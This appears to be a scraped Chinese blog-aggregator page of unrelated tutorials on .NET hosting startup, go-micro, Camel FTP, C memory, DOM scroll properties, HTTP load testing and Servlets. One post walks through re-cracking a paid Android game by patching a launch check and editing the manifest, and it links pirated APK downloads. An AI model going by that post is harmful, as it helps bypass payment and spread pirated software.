· .NET 开源项目 Polly 介绍（Liam Wang）· .Net Core中的Api版本控制（LamondLu）· TCP协议学习总结（上）（wc的一些事一些情）· Jenkins pipeline 并行执行任务流（sparkdev）· 一文搞懂：词法作用域、动态作用域、回调函数、闭包（骏马金龙）· 为什么程序员需要知道互联网行业发展史（kid551）· 用CSS实现一个抽奖转盘（wenr）· 大数据不就是写sql吗?（大叔据）· .NET微服务调查结果（张善友）· 工作五年总结——以及两年前曾提出问题的回答（受戒人）· 我是如何学习数据结构与算法的？（帅地）· 在国企的日子(序言)（心灵之火）
热点新闻：
· 腾讯员工离职忠告：离开大公司 我才知道世界有多坏· 可怕！29岁小伙心脏血管犹如豆腐渣！只因这个习惯· 彭博社曝光的“间谍芯片” 我在淘宝1块钱就能买一个· 这15张图能教给你的东西，比读完100本书还多· 一天内让两位名人去世，这种病是“癌症之王”· 怎样的物理学天才 让诺贝尔奖破例为他改了颁奖地点· 杭州，AI时代的第一个城市“牺牲品”· 贾跃亭提起仲裁欲踢恒大出局 花光8亿美元再要7个亿· 微软开源基于模型的机器学习框架Infer.NET· 陈列平与诺奖失之交臂，但他的贡献远比诺奖重要· 马云放弃在阿里巴巴主要法律实体的所有权· 今天所有美国手机都收到总统警报，到底是咋回事？
********************************************************************************************************************************************************************************************************
.NET Core Agent
.NET Core Agent
熟悉java的朋友肯定知道java agent，当我看到java agent时我很是羡慕，我当时就想.net是否也有类似的功能，于是就搜索各种资料，结果让人很失望。当时根据https://github.com/OpenSkywalking/skywalking-netcore找到这个 https://docs.microsoft.com/en-us/dotnet/framework/unmanaged-api/profiling/profiling-overview，可是不知道怎么用（求指教，听云的APM怎么做的？）。
新的希望
最近看到 https://github.com/OpenSkywalking/skywalking-netcore 更新了，看了一下，找到这个 https://docs.microsoft.com/en-us/aspnet/core/fundamentals/host/platform-specific-configuration
动手测试
首先下载源码 https://github.com/aspnet/Docs/tree/master/aspnetcore/fundamentals/host/platform-specific-configuration/samples/2.x ，这里先介绍下《在 ASP.NET Core 中使用 IHostingStartup 从外部程序集增强应用》的三种方式
从 NuGet 包激活

使用 dotnet pack 命令编译 HostingStartupPackage 包。
将包的程序集名称 HostingStartupPackage 添加到 ASPNETCORE_HOSTINGSTARTUPASSEMBLIES 环境变量中。set ASPNETCORE_HOSTINGSTARTUPASSEMBLIES=HostingStartupPackage
编译并运行应用。 增强型应用中存在包引用（编译时引用）。 应用项目文件中的  指定包项目的输出 (../HostingStartupPackage/bin/Debug) 作为包源。 这允许应用使用该包而无需将包上传到 nuget.org。有关详细信息，请参阅 HostingStartupApp 项目文件中的说明。
set ASPNETCORE_ENVIRONMENT=Development
dotnet HostingStartupApp.dll 访问效果如下：


从类库激活

使用 dotnet build 命令编译 HostingStartupLibrary 类库。
将类库的程序集名称 HostingStartupLibrary 添加到 ASPNETCORE_HOSTINGSTARTUPASSEMBLIES 环境变量中。set ASPNETCORE_HOSTINGSTARTUPASSEMBLIES=HostingStartupLibrary
bin - 通过将类库编译输出中的 HostingStartupLibrary.dll 文件复制到应用的 bin/Debug 文件夹，将类库程序集部署到应用。
set ASPNETCORE_ENVIRONMENT=Development
dotnet HostingStartupApp.dll 访问效果如下：


从运行时存储部署的程序集激活(重点，可以实现Automatic-Agent)

StartupDiagnostics 项目使用 PowerShell 修改其 StartupDiagnostics.deps.json 文件。 默认情况下，Windows 7 SP1 和 Windows Server 2008 R2 SP1 及以后版本的 Windows 上安装有 PowerShell。 若要在其他平台上获取 PowerShell，请参阅安装 Windows PowerShell。
构建 StartupDiagnostics 项目。 构建项目后，会自动生成项目文件中的构建目标：


触发 PowerShell 脚本以修改 StartupDiagnostics.deps.json 文件。
将 StartupDiagnostics.deps.json 文件移动到用户配置文件的 additionalDeps 文件夹。


在承载启动目录的命令提示符处执行 dotnet store 命令，将程序集及其依赖项存储在用户配置文件的运行时存储中：
dotnet store --manifest StartupDiagnostics.csproj --runtime 
对于 Windows，该命令使用 win7-x64 运行时标识符 (RID)。 为其他运行时提供承载启动时，请替换为正确的 RID。
设置环境变量：


set ASPNETCORE_HOSTINGSTARTUPASSEMBLIES=StartupDiagnostics
set DOTNET_ADDITIONAL_DEPS=%UserProfile%.dotnet\x64\additionalDeps\StartupDiagnostics



运行示例应用
请求 /services 终结点以查看应用的注册服务。 请求 /diag 终结点以查看诊断信息。
/services

/diag


总结
用第三种方式就可以实现Automatic-Agent，在此感谢skywalking-netcore的付出.
这里可能没有将清楚agent的概念，还请大家自行补脑。
如有补充或错误请指出，谢谢！

********************************************************************************************************************************************************************************************************
go微服务框架go-micro深度学习(三) Registry服务的注册和发现
     服务的注册与发现是微服务必不可少的功能，这样系统才能有更高的性能，更高的可用性。go-micro框架的服务发现有自己能用的接口Registry。只要实现这个接口就可以定制自己的服务注册和发现。
    go-micro在客户端做的负载，典型的Balancing-aware Client模式。
     
     服务端把服务的地址信息保存到Registry, 然后定时的心跳检查，或者定时的重新注册服务。客户端监听Registry，最好是把服务信息保存到本地，监听服务的变动，更新缓存。当调用服务端的接口是时，根据客户端的服务列表和负载算法选择服务端进行通信。
     go-micro的能用Registry接口

type Registry interface {
    Register(*Service, ...RegisterOption) error
    Deregister(*Service) error
    GetService(string) ([]*Service, error)
    ListServices() ([]*Service, error)
    Watch(...WatchOption) (Watcher, error)
    String() string
    Options() Options
}

type Watcher interface {
    // Next is a blocking call
    Next() (*Result, error)
    Stop()
}

　　这个接口还是很简单明了的，看方法也大概能猜到主要的作用
　　Register方法和Deregister是服务端用于注册服务的，Watcher接口是客户端用于监听服务信息变化的。
      接下来我以go-micro的etcdv3为Registry的例给大家详细讲解一下go-micro的详细服务发现过程
go-micro 服务端注册服务
     流程图

     
     服务端看上去流程还是比较简单的，当服务端调用Run()方法时，会调用service.Start()方法。这个除了监听端口，启动服务，还会把服务的ip端口号信息，和所有的公开接口的元数据信息保存到我们选择的Register服务器上去。
     看上去没有问题，但是，如果我们的节点发生故障，也是需要告诉Register把我们的节点信息删除掉。
     Run()方法中有个go s.run(ex) 方法的调用，这个方法就是根据我们设置interval去重新注册服务，当然比较保险的方式是我们把服务的ttl也设置上，这样当服务在未知的情况下崩溃，到了ttl的时间Register服务也会自动把信息删除掉。
 
    设置服务的ttl和 interval

    // 初始化服务
    service := micro.NewService(
        micro.Name(common.ServiceName),
        micro.RegisterTTL(time.Second*30),
        micro.RegisterInterval(time.Second*20),
        micro.Registry(reg),
    )

  ttl就是注册服务的过期时间，interval就是间隔多久再次注册服务。如果系统崩溃，过期时间也会把服务删除掉。客户端当然也会有想就的判断，下面会详细解说 
客户端发现服务
    客户端的服务发现要步骤多一些，但并不复杂，他涉及到服务选择Selector和服务发现Register两部分。
    Selector是基于服务发现的，根据你选择的主机选择算法，返回主机的信息。默认的情况，go-micro是每次要得到服务器主机的信息都要去Register去获取。但是查看cmd.go的源码你会发现默认初始化的值，selector的默认flag是cache。DefaultSelectors里的cache对应的就是初始化cacheSelector方法

 
    但是当你在执行service.Init()方法时

go-micro会把默认的selector替换成cacheSelector,具体的实现是在cmd.go的Before方法里

cacheSelector 会把从Register里获取的主机信息缓存起来。并设置超时时间，如果超时则重新获取。在获取主机信息的时候他会单独跑一个协程，去watch服务的注册，如果有新节点发现，则加到缓存中，如果有节点故障则删除缓存中的节点信息。当client还要根据selector选择的主机选择算法才能得到主机信息，目前只有两种算法，循环和随机法。为了增加执行效率，很client端也会设置缓存连接池，这个点，以后会详细说。
 所以大概的客户端服务发现流程是下面这样

     主要的调用过程都在Call方法内

 
主要的思路是
    从Selector里得到选择主机策略方法next。
    根据Retory是否重试调用服务，调用服务的过程是，从next 方法内得到主机，连接并传输数据 ，如果失败则重试，重试时，会根据主机选择策略方法next重新得到一个新的主机进行操作。
   
     
 
********************************************************************************************************************************************************************************************************
Spring boot项目集成Camel FTP
目录

1、Spring 中集成camel-ftp
1.1、POM引用
1.2、SpringBoot application.yml配置
1.3、配置路由
1.4、配置文件过滤
1.5、文件处理器

2、参考资料


1、Spring 中集成camel-ftp
  近期项目中涉及到定期获取读取并解析ftp服务器上的文件，自己实现ftp-client的有些复杂，因此考虑集成camel-ftp的方式来解决ftp文件的下载问题。自己则专注于文件的解析工作.
demo: https://github.com/LuckyDL/ftp-camel-demo
1.1、POM引用
<dependency>
    <groupId>org.apache.camel</groupId>
    <artifactId>camel-spring-boot-starter</artifactId>
    <version>2.22.1</version>
</dependency>
<dependency>
    <groupId>org.apache.camel</groupId>
    <artifactId>camel-ftp</artifactId>
    <version>2.22.1</version>
</dependency>


注意：
在选择版本的时候，如果SpringBoot版本是1.5.10.RELEASE的话，那么camel的版本最高只能使用2.21.2，使用2.22版本将会报错。经测试的配套关系如下：




SrpingBoot
Camel




1.5
<=2.21.2


2.0
>=2.22.x



其他情况都会出现错误.

1.2、SpringBoot application.yml配置
ftp:
  addr: 172.18.18.19:21    # ftp地址、端口
  name: ftpuser
  password: ftp2018
  options: password=${ftp.password}&readLock=rename&delay=10s&binary=true&filter=#zipFileFilter&noop=true&recursive=true
  url: ftp://${ftp.name}@${ftp.addr}/?${ftp.options}
  # 本地下载目录
  local-dir: /var/data

# 后台运行进程
camel:
  springboot:
    main-run-controller: true

management:
  endpoint:
    camelroutes:
      enabled: true
      read-only: true

配置说明：

delay：每次读取时间间隔
filter: 指定文件过滤器
noop：读取后对源文件不做任何处理
recursive：递归扫描子目录，需要在过滤器中允许扫描子目录
readLock：对正在写入的文件的处理机制

更多参数配置见官方手册

1.3、配置路由
  要配置从远端服务器下载文件到本地，格式如下，from内部为我们在上面配置的url，to为本地文件路径。
@Component
public class DownloadRoute extends RouteBuilder {
    /** logger */
    private static final Logger logger = LoggerFactory.getLogger(DownloadRoute.class);

    @Value("${ftp.server.info}")
    private String sftpServer;
    
    @Value("${ftp.local.dir}")
    private String downloadLocation;
    
    @Autowired
    private DataProcessor dataProcessor;

    @Override
    public void configure() throws Exception{
        from(sftpServer)
                .to(downloadLocation)
                .process(dataProcessor)
                .log(LoggingLevel.INFO, logger, "Download file ${file:name} complete.");
    }
}

说明：
 若将from配置为本地地址，to配置为远端地址，则可以实现向远端服务器上传文件
 process是数据处理器，如果仅仅是下载文件到本地，那么就不需要该配置。

也可以配置多条路由也处理不同的业务：
@Override
    public void configure() throws Exception{
        // route1
        from(sftpServer)
                .to(downloadLocation)
                .process(dataProcessor)
                .log(LoggingLevel.INFO, logger, "Download file ${file:name} complete.");
        // route2
        from(xxx).to(xxxx);
        
        // route3
        from(xxxx).to(xxx).process(xxx);
    }
1.4、配置文件过滤
  如果ftp服务器上有很多文件，但是我们需要的只是其中的一种，全部下载下来，有业务层来实现过滤肯定不合适，我们可以使用camel-ftp的文件过滤器，通过url中的filter来指定，如“filter=#zipFileFilter”,
用户需要实现GenericFileFilter接口的accept方法。
  例如我们只需要下载后缀名为.zip的压缩包到本地，过滤器的编写方法如下，因为我要递归扫描子目录，因此类型为目录的文件也需要允许通过。
/**
 * camel ftp zip文件过滤器
 */
@Component
public class ZipFileFilter implements GenericFileFilter {
    
    @Override
    public boolean accept(GenericFile file) {
        return file.getFileName().endsWith(".zip") || file.isDirectory();
    }
}
1.5、文件处理器
  文件处理器就是我们对下载到本地的文件进行处理的操作，比如我们可能需要对下载的文件重新规划目录；或者解析文件并进行入库操作等。这就需要通过实现Processer的process方法。
  本文中的demo就是通过processor来解析zip包中的文件内容：
@Component
public class DataProcessor implements Processor {

    /** logger */
    private static final Logger logger = LoggerFactory.getLogger(DataProcessor.class);


    @Value("${ftp.local-dir}")
    private String fileDir;

    @Override
    public void process(Exchange exchange) throws Exception {
        GenericFileMessage<RandomAccessFile> inFileMessage = (GenericFileMessage<RandomAccessFile>) exchange.getIn();
        String fileName = inFileMessage.getGenericFile().getFileName();
        String file_path = fileDir + '/' + fileName;
        readZip(file_path);
    }
    
    ...   // 省略数据处理方法
}
2、参考资料
  关于camel ftp的各个参数配置，参见官方手册：http://camel.apache.org/ftp2.html
  此处需要注意的是，camel ftp手册里面只写了ftp独有的一些配置项，camel-ftp组件继承自camel-file，手册里面有说明，就一句话，不注意就可能忽略了，笔者就是没注意，被递归扫描子目录的问题折腾了2天（阅读要细心o(╥﹏╥)o）。。。因此有一些参数配置项可能在camel-ftp手册里面找不到，请移步至：http://camel.apache.org/file2.html
********************************************************************************************************************************************************************************************************
Android破解学习之路（十）—— 我们恋爱吧 三色绘恋 二次破解
前言
好久没有写破解教程了（我不会告诉你我太懒了），找到一款恋爱游戏，像我这样的宅男只能玩玩恋爱游戏感觉一下恋爱的心动了。。
这款游戏免费试玩，但是后续章节得花6元钱购买，我怎么会有钱呢，而且身在吾爱的大家庭里，不破解一波怎么对得起我破解渣渣的身份呢！
哟，还是支付宝购买的，直接9000大法，但是破解的时候没有成功，可能是支付的关键代码在so文件中把，自己还不是很熟悉IDA破解so，所以就撤了，网上找到了别人的破解版本，直接就是解锁版本的。
但是，这破解版的有点奇葩，第一次打开可以正常进入，第二次打开就卡在了它的logo上（破解者加了一个界面显示logo，就是类似XX侠），把它软件下载之后，再次点击就可以正常进入游戏了，支付宝内购破解我破不了，二次破解我总行吧，我的目的就是不用安装APP也能进入游戏
破解思路

既然第一次可以正常进入，第二次就无法进入，肯定是第二次进入的时候做了个验证
破解者加的那个logo界面，应该是有跳转到正常游戏界面的代码，我们直接在logo界面执行跳转代码，跳转到游戏界面
打开游戏的时候直接跳过logo界面，进入游戏主界面

破解开始
思路1
首先，直接丢进Androidkiller中反编译，这款游戏没有加壳，好说，我们由工程信息的入口进到入口界面，展开方法，可以看到许多方法，由于我们猜想是第二次进入的时候做了验证，那么我们就查找一下方法最末尾为Z（代表着此方法返回的是一个Boolean值），可以看到图中红色方框，末尾为Z，名字也是确定了我们的思路没有错，判断是否第一次进入

破解很简单，我们只需要让此方法直接返回一个true的值即可解决

测试是通过的，这里就不放图了
思路2
第一种的方法尽管成功了，但是觉得不太完美，我们看一下能不能直接跳转到游戏的主界面，搜索intent（android中跳转界面都是需要这个intent来完成），没有找到结果，找到的几个都不是跳转到主界面的代码（这游戏的主界面就是MainActivity）
思路2失败
思路3
思路2失败了，我们还有思路3，首先介绍一下，android的APP，主界面是在AndroidManifest.xml这个文件中定义的
我们直接搜索入口类VqsSdkActivity,搜索中的第一个正是我们需要的

点进入就可以看到，定义游戏的启动界面的关键代码，红色框中

我们把这行代码剪切到MainActivity那边去（我们直接搜索MainActivity就可以定位到AndroidManifest中的具体位置）

嗯，测试通过
再加些东西吧，加个弹窗，名字也改一下吧，大功告成！！
测试截图



下载链接
原版破解版： 链接: https://pan.baidu.com/s/1uvjRCkf2hPdI8vI467Vh5g 提取码: p718
二次破解版本： 链接: https://pan.baidu.com/s/128RH5ij3LRjsZPoG3vTTgQ 提取码: vbmv

********************************************************************************************************************************************************************************************************
C语言程序猿必会的内存四区及经典面试题解析
前言：
　　　 为啥叫C语言程序猿必会呢？因为特别重要，学习C语言不知道内存分区，对很多问题你很难解释，如经典的：传值传地址，前者不能改变实参，后者可以，知道为什么？还有经典面试题如下：　

#include <stdio.h>
#include <stdlib.h>#include <stdlib.h>
void getmemory(char *p)
{
p=(char *) malloc(100);
}
int main( )
{
char *str=NULL;
getmemory(str);
strcpy(str,"hello world");
printf("%s/n",str);
free(str);
return 0;
}

　　这段代码执行了会怎么样？接下里我会解释这道面试题。
　　一、内存布局
　　可能网上有很多把内存分的很多、很细，但觉得很难记，并对于理解问题作用并不大。现在主要将内存分为四区如下：
　　代码区：存放代码；运行期间不可修改
　　全局区：全局变量、静态变量、常量字符串；程序运行时存在，退出时消失。
　　栈区：自动变量、函数参数、函数返回值；作用域函数内（代码块内）
　　堆区：动态分配内存，需手动释放
　　用交换两个数的程序进行解释吧，如下：　

#include<stdio.h>

void swap(int a,int b)
{
    int temp = a;    //栈
    a = b;
    b =temp;
}
int main()
{
    int a=1,b=2;    //栈
    printf("a:%d,b:%d\n",a,b);
    swap(a,b);
    printf("a:%d,b:%d\n",a,b);

    return 0;
}

　　画个图进行讲解，如下：　　PS：依旧是全博客园最丑图，不接受反驳！
　　
　　说明：main函数把a,b的值给了temp函数，temp函数在内部交换了值，并没有影响main函数，并且temp结束，栈上的数据释放。传值不会改变实参。
　　二、程序示例及面试题讲解
　　1、传地址交换两个数　　 
 　　在拿传指针的例子来说明一下，如下：

#include<stdio.h>

void swap(int *a,int *b)
{
    int temp = *a;    //栈
    *a = *b;
    *b =temp;
}
int main()
{
    int a=1,b=2;    //栈
    printf("a:%d,b:%d\n",a,b);
    swap(&a,&b);
    printf("a:%d,b:%d\n",a,b);

    return 0;
}

　　结果：成功交换了实参的值
　　用图进行解释，如下：　　PS：依旧是全博客园最丑图，不接受反驳！
　　
　　说明：实参把地址传给形参，形参*a、*b是取的实参在内存中的值，交换也就是交换实参的值了，所以成功交换了实参的值。
　　2、解释面试题
　　程序就是最开始的面试题那个，不再列出来了。
　　结果：段错误
　　然后画图进行说明，如下：　　PS：依旧是全博客园最丑图，不接受反驳！
　　
　　说明：最重要一点实参是把值传给形参，而不是地址，要理解这一点！就是把实参的NULL给了形参，然后getmemory在堆上开辟空间，结束时p被释放了，但main函数中的str并没有指向堆上的内存，再给strcpy,当然会段错误。
　　三、解决被调函数开辟空间
　　可能有人就问了，我就想让被调函数开空间，怎么办呢？那就需要形参是二级指针了。
　　给大家演示一下，代码如下：

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
void getmemory(char **p)
{
*p=(char *) malloc(100);
}
int main( )
{
char *str=NULL;
getmemory(&str);
strcpy(str,"hello world");
printf("%s/n",str);
free(str);
return 0;
}

　　结果：没有段错误了
　　大家可以自己画下图，不懂欢迎随时留言。
　　三、十月份计划
　　十月份需求会很忙，但也要抽出时间把C++基础学完，然后深入学习数据结构和算法了
　　
 
********************************************************************************************************************************************************************************************************
JavaScript之scrollTop、scrollHeight、offsetTop、offsetHeight、clientHeight、clientTop学习笔记
全文参考：https://github.com/iuap-design/blog/issues/38 、MDN
clientHeight，只读
 clientHeight  可以用公式  CSS height + CSS padding - 水平滚动条的高度 (如果存在)  来计算。

如图，这样一个div，它的clientHeight为95，计算：50(height)+30(padding-top)+30(padding-bottom)-15(经测量滚动条高度就是15)=95

 

clientTop，只读
一个元素顶部边框的宽度（以像素表示）。嗯。。就只是  border-top-width 
类似的属性还有一个 clientLeft ，顾名思义……
 
offsetHeight，只读
元素的offsetHeight是一种元素CSS高度的衡量标准，包括元素的边框、内边距和元素的水平滚动条（如果存在且渲染的话），是一个整数。
还是上面的图，div的offsetHeight为112。计算：50+60(上下内边距)+2(上下边框)=112
 
offsetTop，只读

HTMLElement.offsetParent 是一个只读属性，返回一个指向最近的包含该元素的定位元素。如果没有定位的元素，则 offsetParent 为最近的 table, table cell 或根元素（标准模式下为 html；quirks 模式下为 body）。当元素的 style.display 设置为 "none" 时，offsetParent 返回 null。




















它返回当前元素相对于其 offsetParent 元素的顶部的距离。
还是上面那张图，div的offsetTop为20，因为margin-top是20，距离html顶部的距离是20...
 
scrollHeight，只读
实话，这么久了，竟然一直搞错这个scroll相关属性，其实它描述的是outer的属性，而窝一直取inner的属性值，难怪scrollTop一直是0。。。

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Document</title>
    <style>
        #outer {
            margin: 100px 50px;
            background: url(http://images.cnblogs.com/cnblogs_com/wenruo/873448/o_esdese.jpg);
            height: 100px;
            width: 50px;
            padding: 10px 50px;
            overflow: scroll;
        } 
        #inner {
            height: 200px;
            width: 50px;
            background-color: #d0ffe3;
        }
    </style>
</head>
<body>
    <div id="outer">
        <div id="inner"></div>
    </div>
</body>
</html>

 
因为限制了父元素的高度，所以不能全部显示子元素，设置了overflow之后，可以通过滚动条的形式滑动查看子元素。效果如图1，如果没有限制父元素的高度，那么效果将如图2显示。
（图1）                        （图2）
scrollHeight就是图2的高度，没有高度限制时，能够完全显示子元素时的高度（clientHeight）。
所以这里scrollHeight为220，计算：200+10+10=220
 
scrollTop，可写
是这些元素中唯一一个可写可读的。
下面的图是用微信截图随便画的:D（不小心混入了一个光标。。
 
所以当滚动条在最顶端的时候， scrollTop=0 ，当滚动条在最低端的时候， scrollTop=115 
这个115怎么来的（滚动条高度是15，我量的），见下图。（实为我主观臆测，不保证准确性。。。_(:з」∠)_

scrollTop是一个整数。
如果一个元素不能被滚动，它的scrollTop将被设置为0。
设置scrollTop的值小于0，scrollTop 被设为0。
如果设置了超出这个容器可滚动的值, scrollTop 会被设为最大值。
 
判定元素是否滚动到底：

element.scrollHeight - element.scrollTop === element.clientHeight

返回顶部

element.scrollTop = 0

 
一个简单的返回顶部的时间，一个需要注意的地方是，动画是由快到慢的。

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>返回顶部</title>
    <style>
        #outer { height: 100px; width: 100px; padding: 10px 50px; border: 1px solid; overflow: auto; }
    </style>
</head>
<body>
    <div id="outer">
        <div id="inner"></div>
    </div>
    <button onclick="toTop(outer)">返回顶部</button>
    <script>
        function toTop(ele) {
            // ele.scrollTop = 0;
            let dy = ele.scrollTop / 4; // 每次更新scrollTop改变的大小
            if (ele.scrollTop > 0) {
                ele.scrollTop -= Math.max(dy, 10);
                setTimeout(() => {
                    toTop(ele, dy);
                }, 30);
            }
        }
        // 初始化
        window.onload = () => {
            for (let i = 0; i < 233; i++) inner.innerText += `第${i}行\n`;
        }
    </script>
</body>
</html>

 
********************************************************************************************************************************************************************************************************
http性能测试点滴
WeTest 导读
在服务上线之前，性能测试必不可少。本文主要介绍性能测试的流程，需要关注的指标，性能测试工具apache bench的使用，以及常见的坑。
 

 


什么是性能测试


 
性能测试是通过自动化的测试工具模拟多种正常、峰值以及异常负载条件来对系统的各项性能指标进行测试。负载测试和压力测试都属于性能测试，两者可以结合进行。通过负载测试，确定在各种工作负载下系统的性能，目标是测试当负载逐渐增加时，系统各项性能指标的变化情况。压力测试是通过确定一个系统的瓶颈或者不能接受的性能点，来获得系统能提供的最大服务级别的测试。
 


性能测试的目标是什么


性能测试最终的目的，是找到系统的瓶颈，一般来说，是找到服务单机最大TPS(每秒完成的事务数)。
需要注意的是，服务的TPS需要结合请求平均耗时来综合考虑。例如：服务TPS压到1000，平均请求耗时500ms，但是假如我们定的服务请求耗时不能超过200ms，那么这个1000的TPS是无效的。
很多场景下，服务都会设置超时时间，若平均耗时超过此超时时间，则可认为服务处于不可用状态。


什么时候需要性能测试


1.功能测试完成之后，上线之前。
正常情况下，上线之前，都应该进行性能测试，尤其是请求量较大的接口，重点业务的核心接口，以及直接影响用户操作流程的接口。
2.各种大促，运营活动开始之前。
大促，运营活动，都会导致流量激增，因此上线之前做好压力测试，评估系统性能是否满足预估流量，提前做好准备。
举个反面例子：聚美优品，年年大促年年挂。
再来个正面的例子：每年双十一之前，阿里都会有全链路压测，各个业务自己也会有独立的压测，阿里在这块做得还是非常不错的。


怎么做性能测试


常见的http性能测试工具
1. httpload

2. wrk

3. apache bench



 
 
最终我们选择apache bench
 
看上去wrk才是最完美的，但是我们却选择了ab。我们验证过各种工具请求数据是否准确，压测的时候，通过后台日志记录，最终得出结论，ab的请求数误差在千分之二左右，而其他两个工具在千分之五左右。
不过不得不说，wrk的确是一款非常优秀的压测工具，采用异步IO模型，能压到非常高的TPS。曾经用空逻辑接口压到过7w的TPS，而相同接口，ab只能压到2w多。


apache bench的使用


前面已经给了一个简单的例子了，下面详细介绍下ab的使用。
如何安装？如果docker容器已经安装的apache，那么恭喜，ab是apache自带的一个组件，不用重新安装了。当然，也可以自己单独安装apache bench。

ab 常用参数介绍
参数说明：格式：ab [options] [http://]hostname[:port]/path-n requests Number of requests to perform     //本次测试发起的总请求数-c concurrency Number of multiple requests to make　　 //一次产生的请求数（或并发数）-t timelimit Seconds to max. wait for responses　　　　//测试所进行的最大秒数，默认没有时间限制。-r Don't exit on socket receive errors.     // 抛出异常继续执行测试任务 -p postfile File containing data to POST　　//包含了需要POST的数据的文件，文件格式如“p1=1&p2=2”.使用方法是 -p 111.txt-T content-type Content-type header for POSTing//POST数据所使用的Content-type头信息，如 -T “application/x-www-form-urlencoded” 。 （配合-p）-v verbosity How much troubleshooting info to print//设置显示信息的详细程度 – 4或更大值会显示头信息， 3或更大值可以显示响应代码(404, 200等), 2或更大值可以显示警告和其他信息。 -V 显示版本号并退出。-C attribute Add cookie, eg. -C “c1=1234,c2=2,c3=3” (repeatable)//-C cookie-name=value 对请求附加一个Cookie:行。 其典型形式是name=value的一个参数对。此参数可以重复，用逗号分割。提示：可以借助session实现原理传递 JSESSIONID参数， 实现保持会话的功能，如-C ” c1=1234,c2=2,c3=3, JSESSIONID=FF056CD16DA9D71CB131C1D56F0319F8″ 。-w Print out results in HTML tables　　//以HTML表的格式输出结果。默认时，它是白色背景的两列宽度的一张表。-i Use HEAD instead of GET-x attributes String to insert as table attributes-y attributes String to insert as tr attributes-z attributes String to insert as td or th attributes-H attribute Add Arbitrary header line, eg. ‘Accept-Encoding: gzip’ Inserted after all normal header lines. (repeatable)-A attribute Add Basic WWW Authentication, the attributesare a colon separated username and password.-P attribute Add Basic Proxy Authentication, the attributes are a colon separated username and password.-X proxy:port Proxyserver and port number to use-V Print version number and exit-k Use HTTP KeepAlive feature-d Do not show percentiles served table.-S Do not show confidence estimators and warnings.-g filename Output collected data to gnuplot format file.-e filename Output CSV file with percentages served-h Display usage information (this message)
 


性能测试报告



 
测试报告应该包含以下内容。当然，根据场景不同，可以适当增减指标，例如有的业务要求关注cpu，内存，IO等指标，此时就应该加上相关指标。

 


常见的坑


1.AB发送的是http1.0请求。
2.-t可以指定时间，-n指定发送请求总数，同时使用时压测会在-t秒或者发送了-n个请求之后停止。但是-t一定要在-n之前（ab的bug，-n在-t之前最多只会跑5s）。
3.为了使测试结果更可靠，单次压测时间应在2分钟以上。
理论上，压测时间越长，结果误差越小。同时，可以在瓶颈附近进行长时间压测，例如一个小时或者一天，可以用来测试系统稳定性。许多系统的bug都是在持续压力下才会暴露出来。
4.小心压测客户端成为瓶颈。
例如上传，下载接口的压测，此时压测客户端的网络上行，下行速度都会有瓶颈，千万小心服务器还没到达瓶颈时，客户端先到了瓶颈。此时，可以利用多客户端同时压测。
5.ab可以将参数写入文件中，用此种方式可以测试上传文件的接口。
 需要配合-p -t 使用。
 
$ ab -n 10000 -c 8 -p post_image_1k.txt -T "multipart/form-data; boundary=1234567890" http://xxxxxxx
 
文件内容如下：


 
6.ab不支持动态构建请求参数，wrk可配合lua脚本支持动态构建请求参数，还是比较牛的。
package.path = '/root/wrk/?.lua;'local md5 = require "md5"local body   = [[BI_login|userid{145030}|openid{4-22761563}|source{}|affiliate{}|creative{}|family{}|genus{0}|ip{180.111.151.116}|from_uid{0}|login_date{2016-11-04}|login_time{10:40:13}|extra{}|srcid{1}|snid{1002}|clientid{1253}|gameid{2100012}BI_logout|userid{184103}|openid{4-22784181}|family{}|genus{0}|ip{218.2.96.82}|logout_date{2016-11-04}|logout_time{10:40:42}|extra{}|srcid{1}|snid{1002}|clientid{1253}|gameid{2100012}BI_role_logout|roleid{184103}|userid{184103}|openid{4-22784181}|ip{218.2.96.82}|level{100}|money{468}|power{1}|exp{252}|lijin{0}|online_time{0}|mapid{0}|posx{0}|posy{0}|rolelogout_date{2016-11-04}|rolelogout_time{10:40:42}|extra{0}|srcid{0}|snid{1002}|clientid{1253}|gameid{2100012}BI_logout|userid{71084}|openid{4-20974629}|family{}|genus{0}|ip{117.136.8.76}|logout_date{2016-11-04}|logout_time{10:40:43}|extra{}|srcid{1}|snid{1002}|clientid{1253}|gameid{2100012}]] --local body = "hello"wrk.headers["Content-Type"] = "text/xml"local i=0request = function()   i = i+1   local path = "/v1/pub?gameid=510038&timestamp=%s&key=510038&type=basic&sign=%s"   local time = os.time()*1000   local v = "510038" .. time .. "basic98889999"   local sign = md5.sumhexa(v)   path = string.format(path, time, sign)   --print(path)   return wrk.format("POST", path, nil, body)end
 

 

 
腾讯WeTest推出的“压测大师”，一分钟完成用例配置，无需维护测试环境，支持http协议、API接口、网站等主流压测场景。
点击：https://wetest.qq.com/gaps 即可体验。
 
如果使用当中有任何疑问，欢迎联系腾讯WeTest企业QQ：2852350015。
********************************************************************************************************************************************************************************************************
06-码蚁JavaWeb之Servlet生命周期与基本配置
学习地址:[撩课-JavaWeb系列1之基础语法-前端基础][撩课-JavaWeb系列2之XML][撩课-JavaWeb系列3之MySQL][撩课-JavaWeb系列4之JDBC][撩课-JavaWeb系列5之web服务器-idea]
 

Servlet生命周期

Servlet什么时候被创建
1.默认情况下第一次访问的时候创建
2.可以通过配置文件设置服务器启动的时候就创建





`init()`
    servlet对象创建的时候调用
    默认第一次访问时创建
`service()`
    每次请求都会执行一次
`destroy()`
    servlet对象销毁的时候执行
    默认服务器关闭时销毁
`load-on-startup配置`
    对象在服务器启动时就创建
    值为数字代表优先级
    数据越小，优先级越高，不能为负数


Servlet配置信息

初始化参数

<init-params>
    <init-name>名称</init-name>
    <init-value>值</init-value>
    config参数
        该servlert的配置信息
        获得web.xml当中参数
        初始化参数
        获取servletContext对象

url-patten
1.完全匹配
        
2.目录匹配
        
3.扩展名匹配

缺省Servlet
访问的资源不存在时，就会找缺省的地址
<url-patten>/</url-patten>]

全局Web.xml
对于部署在服务器上的所有应用都有效
先到自己工程当中找web.xml配置
再到全局web.xml当中去找配置
如果两个当中有相同的配置
自己当中配置的内容会生效

静态资源加载过程
在path后面写的静态资源名称index.html
或者是其它的.html
它都是会找ur-patten当中
有没有匹配的内容

如果有，就加载对应的servlet
如果没有
就到自己配置当中
找缺省的url-patten

如果自己配置文件当中
没有缺省的
就会找全局配置缺省的url-patten

在全局配置当中
有一个缺省的url-patten 
对应的是default的Servlet
defaultServlet内部
会到当前访问的工程根目录当中
去找对应的名称的静态资源
